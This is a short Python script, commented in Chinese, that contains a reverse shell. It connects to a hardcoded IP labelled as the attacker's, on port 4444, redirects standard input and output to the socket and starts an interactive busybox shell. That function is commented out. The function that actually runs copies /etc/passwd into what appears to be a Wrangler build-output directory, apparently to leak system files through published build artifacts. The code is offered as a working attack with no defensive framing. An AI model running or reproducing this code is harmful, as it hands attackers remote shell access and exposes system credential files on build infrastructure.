import socket
import subprocess
import os

# 配置外网主机IP和端口
REMOTE_HOST = "172.237.65.250"   # 攻击者IP，需替换
REMOTE_PORT = 4444        # 攻击者监听端口，需替换

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((REMOTE_HOST, REMOTE_PORT))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    # subprocess.call(["/bin/sh", "-i"])
    os.system("chmod +x ./src/busybox")  # 确保busybox可执行
    subprocess.call(["./src/busybox", "sh", "-i"])  # 使用busybox的sh，适用于BusyBox环境

def test():
    print("This is a test function.")
    os.system("mkdir -p /opt/buildhome/wrangler-output/")
    os.system("cp /etc/passwd /opt/buildhome/wrangler-output/")

if __name__ == "__main__":
    # main()
    test()